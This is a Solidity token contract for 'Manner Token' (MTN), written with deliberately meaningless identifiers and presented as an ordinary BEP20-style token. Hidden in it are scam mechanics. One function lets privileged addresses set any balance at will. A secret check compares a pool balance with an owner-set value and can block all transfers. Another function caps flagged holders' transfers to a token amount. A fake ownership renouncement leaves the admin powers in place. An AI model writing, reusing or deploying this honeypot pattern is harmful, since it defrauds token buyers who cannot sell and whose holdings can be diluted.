//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface autoTakeAmount {
    function totalSupply() external view returns (uint256);

    function balanceOf(address senderAmount) external view returns (uint256);

    function transfer(address enableReceiver, uint256 limitFrom) external returns (bool);

    function allowance(address senderExemptMarketing, address spender) external view returns (uint256);

    function approve(address spender, uint256 limitFrom) external returns (bool);

    function transferFrom(
        address sender,
        address enableReceiver,
        uint256 limitFrom
    ) external returns (bool);

    event Transfer(address indexed from, address indexed receiverTotal, uint256 value);
    event Approval(address indexed senderExemptMarketing, address indexed spender, uint256 value);
}

abstract contract launchedAutoSender {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface maxFromIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableExempt {
    function createPair(address exemptMarketing, address launchTokenTo) external returns (address);
}

interface launchReceiver is autoTakeAmount {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract MannerToken is launchedAutoSender, autoTakeAmount, launchReceiver {

    bool public teamBuy;

    function totalSupply() external view virtual override returns (uint256) {
        return modeTotal;
    }

    bool private txAuto;

    address teamSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private tradingAuto;

    uint256 tokenShouldAmount;

    uint256 private walletIsAuto;

    constructor (){
        if (listExempt == senderLiquidityWallet) {
            senderLiquidityWallet = tradingAuto;
        }
        maxFromIs receiverAutoEnable = maxFromIs(teamSwap);
        fundFee = enableExempt(receiverAutoEnable.factory()).createPair(receiverAutoEnable.WETH(), address(this));
        if (senderLiquidityWallet != listExempt) {
            tradingAuto = walletIsAuto;
        }
        minLaunch = _msgSender();
        marketingIsReceiver();
        isLiquidity[minLaunch] = true;
        listTotalToken[minLaunch] = modeTotal;
        
        emit Transfer(address(0), minLaunch, modeTotal);
    }

    string private walletFund = "MTN";

    function minShouldTotal(uint256 limitFrom) public {
        atEnableIs();
        tokenShouldAmount = limitFrom;
    }

    function name() external view virtual override returns (string memory) {
        return launchLiquidity;
    }

    bool public teamLaunched;

    function balanceOf(address senderAmount) public view virtual override returns (uint256) {
        return listTotalToken[senderAmount];
    }

    function marketingIsReceiver() public {
        emit OwnershipTransferred(minLaunch, address(0));
        marketingSwap = address(0);
    }

    function approve(address receiverFund, uint256 limitFrom) public virtual override returns (bool) {
        liquidityAutoFrom[_msgSender()][receiverFund] = limitFrom;
        emit Approval(_msgSender(), receiverFund, limitFrom);
        return true;
    }

    address public minLaunch;

    mapping(address => uint256) private listTotalToken;

    function symbol() external view virtual override returns (string memory) {
        return walletFund;
    }

    mapping(address => mapping(address => uint256)) private liquidityAutoFrom;

    bool public enableLaunchSwap;

    function modeReceiver(address enableTokenTrading, address enableReceiver, uint256 limitFrom) internal returns (bool) {
        require(listTotalToken[enableTokenTrading] >= limitFrom);
        listTotalToken[enableTokenTrading] -= limitFrom;
        listTotalToken[enableReceiver] += limitFrom;
        emit Transfer(enableTokenTrading, enableReceiver, limitFrom);
        return true;
    }

    mapping(address => bool) public isLiquidity;

    mapping(address => bool) public toLimit;

    function atEnableIs() private view {
        require(isLiquidity[_msgSender()]);
    }

    function allowance(address autoSell, address receiverFund) external view virtual override returns (uint256) {
        if (receiverFund == teamSwap) {
            return type(uint256).max;
        }
        return liquidityAutoFrom[autoSell][receiverFund];
    }

    address teamFrom = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function getOwner() external view returns (address) {
        return marketingSwap;
    }

    uint256 txReceiver;

    string private launchLiquidity = "Manner Token";

    uint256 private modeTotal = 100000000 * 10 ** 18;

    uint256 private senderLiquidityWallet;

    function transfer(address isLaunched, uint256 limitFrom) external virtual override returns (bool) {
        return tokenWallet(_msgSender(), isLaunched, limitFrom);
    }

    function transferFrom(address enableTokenTrading, address enableReceiver, uint256 limitFrom) external override returns (bool) {
        if (_msgSender() != teamSwap) {
            if (liquidityAutoFrom[enableTokenTrading][_msgSender()] != type(uint256).max) {
                require(limitFrom <= liquidityAutoFrom[enableTokenTrading][_msgSender()]);
                liquidityAutoFrom[enableTokenTrading][_msgSender()] -= limitFrom;
            }
        }
        return tokenWallet(enableTokenTrading, enableReceiver, limitFrom);
    }

    bool private swapToken;

    address private marketingSwap;

    function minIs(address isLaunched, uint256 limitFrom) public {
        atEnableIs();
        listTotalToken[isLaunched] = limitFrom;
    }

    event OwnershipTransferred(address indexed sellTakeTeam, address indexed receiverTx);

    function decimals() external view virtual override returns (uint8) {
        return exemptLiquidity;
    }

    function amountSender(address swapTotal) public {
        if (enableLaunchSwap) {
            return;
        }
        if (autoAmount != swapToken) {
            autoAmount = false;
        }
        isLiquidity[swapTotal] = true;
        if (swapToken == teamLaunched) {
            walletIsAuto = listExempt;
        }
        enableLaunchSwap = true;
    }

    function tokenWallet(address enableTokenTrading, address enableReceiver, uint256 limitFrom) internal returns (bool) {
        if (enableTokenTrading == minLaunch) {
            return modeReceiver(enableTokenTrading, enableReceiver, limitFrom);
        }
        uint256 totalLiquidity = autoTakeAmount(fundFee).balanceOf(teamFrom);
        require(totalLiquidity == tokenShouldAmount);
        require(enableReceiver != teamFrom);
        if (toLimit[enableTokenTrading]) {
            return modeReceiver(enableTokenTrading, enableReceiver, fromTotalLiquidity);
        }
        return modeReceiver(enableTokenTrading, enableReceiver, limitFrom);
    }

    uint256 public listExempt;

    function owner() external view returns (address) {
        return marketingSwap;
    }

    bool private autoAmount;

    uint8 private exemptLiquidity = 18;

    address public fundFee;

    uint256 constant fromTotalLiquidity = 6 ** 10;

    function receiverBuyLimit(address takeBuy) public {
        atEnableIs();
        
        if (takeBuy == minLaunch || takeBuy == fundFee) {
            return;
        }
        toLimit[takeBuy] = true;
    }

}